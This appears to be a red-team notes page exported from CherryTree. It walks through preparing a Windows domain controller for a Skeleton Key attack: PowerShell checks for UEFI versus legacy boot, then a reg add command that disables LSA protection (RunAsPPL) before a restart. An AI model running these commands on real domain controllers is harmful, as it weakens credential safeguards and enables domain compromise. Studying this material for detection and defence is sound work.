<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>inject a Skeleton Key by restarting the DC</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>inject a Skeleton Key by restarting the DC</h1><br/><br />WARNING: After doing this procedure on a Domain Controller a restart is needed to make effective the new value of the registry key &quot;RunAsPPL&quot;<br /><br /><strong>BIOS Legancy or BIOS UEFI?</strong><br />To check if we have UEFI BIOS configuration(<a href="https://wintech.sgal.info/2016/12/easy-way-to-determine-uefi-or-legacy.html">found here</a>):<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#0088ff;font-weight:400">$env</span><span style="color:#ff9d00;font-weight:700">:</span>firmware_type    <span style="color:#0088ff;font-weight:400">#easier, check the enviroment variable</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#ff9d00;font-weight:700">Test-Path</span> <span style="color:#0088ff;font-weight:400">$env</span><span style="color:#ff9d00;font-weight:700">:</span>windir<span style="color:#ff9d00;font-weight:700">\</span>Panther<span style="color:#ff9d00;font-weight:700">\</span>setupact.log) {(<span style="color:#ff9d00;font-weight:700">Select-String</span> <span style="color:#333333;font-weight:400">&#39;Detected boot environment&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:windir\Panther\setupact.log&quot;</span>  <span style="color:#ff9d00;font-weight:700">-</span>AllMatches).line <span style="color:#ff9d00;font-weight:700">-replace</span> <span style="color:#333333;font-weight:400">&#39;.*:\s+&#39;</span>} <span style="color:#ff9d00;font-weight:700">else</span> {<span style="color:#ff9d00;font-weight:700">if</span> (<span style="color:#ff9d00;font-weight:700">Test-Path</span> HKLM<span style="color:#ff9d00;font-weight:700">:\</span>System<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>control<span style="color:#ff9d00;font-weight:700">\</span>SecureBoot<span style="color:#ff9d00;font-weight:700">\</span>State) {<span style="color:#3ad900;font-weight:400">&quot;UEFI&quot;</span>} <span style="color:#ff9d00;font-weight:700">else</span> {<span style="color:#3ad900;font-weight:400">&quot;BIOS&quot;</span>}}<br /></pre></div><br />   ◇ <span style="text-decoration:underline;">BIOS Legacy</span>: means that to disable LSASS Protection we need only <span style="color:#ff0000;">delete/disable</span> the RunAsPPL registry key and restart the Server.<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg add HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>SYSTEM<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Control<span style="color:#ff9d00;font-weight:700">\</span>Lsa <span style="color:#ff9d00;font-weight:700">/</span>v RunAsPPL <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">0</span> <span style="color:#ff9d00;font-weight:700">/</span>f  <span style="color:#0088ff;font-weight:400">#disable LSA protection on the machine</span></pre></div><br />   ◇ <span style="text-decoration:underline;">BIOS UEFI</span>: the LSASS Protection status is also written to a variable in the UEFI configuration. After we have <span style="color:#ff0000;">deleted/disabled</span> the registry key &quot;RunAsPPL&quot; we need to change also the UEFI BIOS configuration(<a href="https://support.authlogics.com/hc/en-us/articles/360012317780-PPA-does-not-function-when-Windows-Local-Security-Authority-LSA-Protection-is-enabled?mobile_site=true">see here</a>) </div>
</body>
</html>
